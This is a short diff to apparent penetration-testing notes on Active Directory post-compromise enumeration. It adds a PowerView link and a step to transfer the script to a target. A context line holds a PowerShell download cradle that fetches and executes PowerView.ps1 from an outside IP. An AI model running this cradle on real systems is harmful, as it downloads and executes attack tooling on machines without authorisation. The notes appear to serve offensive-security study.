@@ -18,6 +18,10 @@ IEX(New-Object Net.WebClient).downloadString('http://10.10.16.17/PowerView.ps1')
 
 ## Post-Compromise Enumeration
 
+{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" %}
+
+* Transfer PowerView.ps1 to target
+
 ### Get Domain Users
 
 ```python
